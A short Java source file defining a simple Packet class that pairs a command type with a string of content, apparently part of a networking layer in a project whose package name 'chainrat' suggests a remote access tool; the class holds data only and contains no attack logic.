package com.nefi.chainrat.networking.packets;

import com.nefi.chainrat.networking.CommandType;

public class Packet {
    public CommandType type;
    public String content;
    public Packet(CommandType type, String content){
        this.type = type;
        this.content = content;
    }
}
